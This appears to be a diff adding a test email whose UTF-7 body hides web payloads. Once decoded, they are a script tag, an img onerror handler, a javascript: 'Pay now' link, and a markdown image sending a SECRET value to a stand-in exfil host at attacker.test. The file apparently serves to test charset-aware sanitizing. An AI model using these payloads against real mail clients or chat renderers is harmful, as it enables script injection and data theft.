@@ -1,0 +1,12 @@
+From: Seven Bit <utf7@attacker.test>
+To: Lena Hofer <lena@hofer-design.example>
+Subject: Legacy charset
+Message-ID: <utf7-1@attacker.test>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-7
+
+UTF-7 body: harmless bytes on the wire, markup and links once decoded.
++ADw-script+AD4-alert+ACg-1+ACkAPAAv-script+AD4-
++ACEAWw-x+AF0AKA-https+ADoALwAv-exfil+AC4-attacker+AC4-test+AC8-u7+AC4-png+AD8-q+AD0-SECRET+ACk-
++ADw-img src+AD0-x onerror+AD0-alert+ACg-1+ACkAPg-
++AFs-Pay now+AF0AKA-javascript+ADo-alert+ACg-1+ACkAKQ-
